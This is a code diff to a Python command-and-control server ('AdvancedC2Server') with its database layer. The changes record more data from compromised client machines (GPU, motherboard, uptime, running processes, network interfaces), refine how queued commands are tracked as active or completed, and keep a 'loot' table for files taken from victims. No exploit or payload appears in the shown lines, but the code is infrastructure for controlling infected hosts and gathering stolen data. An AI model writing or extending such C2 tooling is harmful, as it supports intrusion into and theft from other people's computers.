@@ -99,24 +99,22 @@ class DatabaseManager:
             )
         ''')
         try:
-            c.execute("ALTER TABLE commands ADD COLUMN is_active BOOLEAN DEFAULT 0")
+            c.execute('ALTER TABLE system_info ADD COLUMN uptime REAL')
         except: pass
-        c.execute('''
-            CREATE TABLE IF NOT EXISTS system_info (
-                id INTEGER PRIMARY KEY AUTOINCREMENT,
-                client_id TEXT,
-                cpu_usage REAL,
-                memory_usage REAL,
-                memory_total REAL,
-                disk_usage REAL,
-                disk_total REAL,
-                network_interfaces TEXT,
-                running_processes TEXT,
-                network_connections TEXT,
-                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP
-            )
-        ''')
+        try:
+            c.execute('ALTER TABLE clients ADD COLUMN gpu TEXT')
+        except: pass
+        try:
+            c.execute('ALTER TABLE clients ADD COLUMN motherboard TEXT')
+        except: pass
         c.execute('CREATE TABLE IF NOT EXISTS loot (id INTEGER PRIMARY KEY, client_id TEXT, type TEXT, filename TEXT, path TEXT, timestamp TEXT)')
+        
+        # Reset all clients to offline and mark commands as inactive on server restart
+        try:
+            c.execute("UPDATE clients SET status = 'offline'")
+            c.execute("UPDATE commands SET is_active = 0 WHERE is_active = 1")
+        except: pass
+        
         c.commit()
     def execute(self, q, p=()):
         conn = self._conn()
@@ -129,24 +127,37 @@ class DatabaseManager:
         return [dict(r) for r in res]
     def update_command_status(self, cmd_id, status, result=None, error=None, is_active=None):
         ts = datetime.datetime.now().isoformat()
-        q = "UPDATE commands SET status = ?, result = ?, error_message = ?, updated_at = ?"
-        p = [status, result, error, ts]
         
+        # Base query and params
+        updates = ["status = ?", "updated_at = ?"]
+        params = [status, ts]
+        
+        # Only update result if provided
+        if result is not None:
+            updates.append("result = ?")
+            params.append(result)
+            
+        # Only update error_message if provided
+        if error is not None:
+            updates.append("error_message = ?")
+            params.append(error)
+            
         if is_active is not None:
-            q += ", is_active = ?"
-            p.append(is_active)
+            updates.append("is_active = ?")
+            params.append(is_active)
         elif status in ('completed', 'failed', 'cancelled'):
-            q += ", is_active = 0"
+            updates.append("is_active = 0")
         elif status == 'executing':
-            q += ", is_active = 1"
+            updates.append("is_active = 1")
             
         if status in ('completed', 'failed', 'cancelled'):
-            q += ", execution_time = ?"
-            p.append(ts)
+            updates.append("execution_time = ?")
+            params.append(ts)
             
-        q += " WHERE id = ?"
-        p.append(cmd_id)
-        self.execute(q, p)
+        q = f"UPDATE commands SET {', '.join(updates)} WHERE id = ?"
+        params.append(cmd_id)
+        
+        self.execute(q, params)
 
 class AdvancedC2Server:
     def __init__(self, config: ServerConfig):
@@ -493,8 +504,8 @@ class AdvancedC2Server:
                     self.db.execute("""
                         INSERT INTO system_info (
                             client_id, cpu_usage, memory_usage, memory_total, disk_usage, disk_total,
-                            network_connections, timestamp
-                        ) VALUES (?, ?, ?, ?, ?, ?, ?, ?)
+                            network_interfaces, running_processes, network_connections, uptime, timestamp
+                        ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
                     """, (
                         cid, 
                         metrics.get('cpu_usage', 0),
@@ -502,7 +513,10 @@ class AdvancedC2Server:
                         metrics.get('memory_total', 0),
                         metrics.get('disk_usage', 0),
                         metrics.get('disk_total', 0),
+                        json.dumps(metrics.get('network_interfaces', {})),
+                        json.dumps(metrics.get('running_processes', [])),
                         str(metrics.get('network_connections', 0)),
+                        metrics.get('uptime', 0),
                         datetime.datetime.now().isoformat()
                     ))
                 except: pass
@@ -554,8 +568,8 @@ class AdvancedC2Server:
                     self.db.execute("""
                         INSERT INTO system_info (
                             client_id, cpu_usage, memory_usage, memory_total, disk_usage, disk_total,
-                            network_interfaces, running_processes, network_connections, timestamp
-                        ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
+                            network_interfaces, running_processes, network_connections, uptime, timestamp
+                        ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
                     """, (
                         cid, 
                         m.get('cpu_usage', 0),
@@ -566,6 +580,7 @@ class AdvancedC2Server:
                         json.dumps(m.get('network_interfaces', {})),
                         json.dumps(m.get('running_processes', [])),
                         str(m.get('network_connections', 0)),
+                        m.get('uptime', 0),
                         datetime.datetime.now().isoformat()
                     ))
             except Exception as e:
@@ -590,10 +605,11 @@ class AdvancedC2Server:
             self.db.execute(query, params)
             return
         if m_type == 'status_update':
-            rid = msg.get('id')
+            rid = msg.get('command_id') or msg.get('id')
             is_active = msg.get('is_active', 0)
+            status = msg.get('status', 'completed' if is_active == 0 else 'executing')
             if rid:
-                self.db.update_command_status(rid, 'completed' if is_active == 0 else 'executing', is_active=is_active)
+                self.db.update_command_status(rid, status, is_active=is_active)
             return
         if m_type == 'error':
             rid = msg.get('command_id') or msg.get('id')
@@ -605,8 +621,15 @@ class AdvancedC2Server:
             rid = msg.get('id') or 'cmd'
             data = msg.get('data')
             
-            # Update database if this was a queued command
-            self.db.update_command_status(rid, 'completed', result=json.dumps(data))
+            # Check if command is active and should remain executing
+            try:
+                row = self.db.execute("SELECT is_active, status FROM commands WHERE id = ?", (rid,)).fetchone()
+                if row and row['is_active'] == 1:
+                    self.db.update_command_status(rid, row['status'], result=json.dumps(data), is_active=1)
+                else:
+                    self.db.update_command_status(rid, 'completed', result=json.dumps(data))
+            except Exception as e:
+                self.db.update_command_status(rid, 'completed', result=json.dumps(data))
             
             print(f"{Fore.CYAN}\n[RESULT][{cid}] [{rid}]")
             if isinstance(data, dict):
@@ -619,12 +642,6 @@ class AdvancedC2Server:
             else:
                 print(f"{Fore.WHITE}{data}")
             print(f"{Fore.CYAN}{'='*40}{Style.RESET_ALL}\n")
-        elif m_type == 'status_update':
-            rid = msg.get('command_id')
-            status = msg.get('status')
-            is_active = msg.get('is_active')
-            if rid:
-                self.db.update_command_status(rid, status, is_active=is_active)
         elif m_type == 'loot':
             self._save_loot(cid, msg)
         elif m_type == 'error':
@@ -696,16 +713,18 @@ class AdvancedC2Server:
         u = info.get('username') or info.get('user') or '?'
         
         self.db.execute('''
-            INSERT INTO clients (id, ip_address, hostname, os, username, last_seen, status) 
-            VALUES (?,?,?,?,?,?,?)
+            INSERT INTO clients (id, ip_address, hostname, os, username, last_seen, status, gpu, motherboard) 
+            VALUES (?,?,?,?,?,?,?,?,?)
             ON CONFLICT(id) DO UPDATE SET 
                 ip_address=excluded.ip_address,
                 hostname=excluded.hostname,
                 os=excluded.os,
                 username=excluded.username,
                 last_seen=excluded.last_seen,
-                status='online'
-        ''', (cid, ip, h, o, u, datetime.datetime.now().isoformat(), 'online'))
+                status='online',
+                gpu=excluded.gpu,
+                motherboard=excluded.motherboard
+        ''', (cid, ip, h, o, u, datetime.datetime.now().isoformat(), 'online', info.get('gpu'), info.get('motherboard')))
 
     def _remove_client(self, cid):
         with self.client_lock:
